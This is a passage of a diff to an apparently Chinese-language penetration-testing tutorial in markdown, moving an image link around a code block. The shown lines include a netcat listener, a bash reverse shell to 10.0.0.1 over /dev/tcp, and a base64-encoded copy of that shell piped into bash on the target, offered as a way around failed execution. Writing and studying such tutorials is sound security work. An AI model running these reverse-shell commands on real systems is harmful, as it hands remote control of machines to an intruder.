@@ -51,12 +51,12 @@ nc -lvnp 12345
 bash -c ‘bash -i >& /dev/tcp/10.0.0.1/12345 0>&1‘
 ```
 如果直接执行失败，可以尝试将命令写入文件后通过`curl`下载执行，或进行Base64编码后解码执行：
-```bash
-# Base64编码上述命令
-echo ‘bash -c “bash -i >& /dev/tcp/10.0.0.1/12345 0>&1”‘ | base64
 
 ![](img/63d5e3a07ead316649f19c6cd9d414e7_15.png)
 
+```bash
+# Base64编码上述命令
+echo ‘bash -c “bash -i >& /dev/tcp/10.0.0.1/12345 0>&1”‘ | base64
 # 目标服务器执行解码后的命令
 echo ‘YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8xMjM0NSAwPiYxIicK‘ | base64 -d | bash
 ```
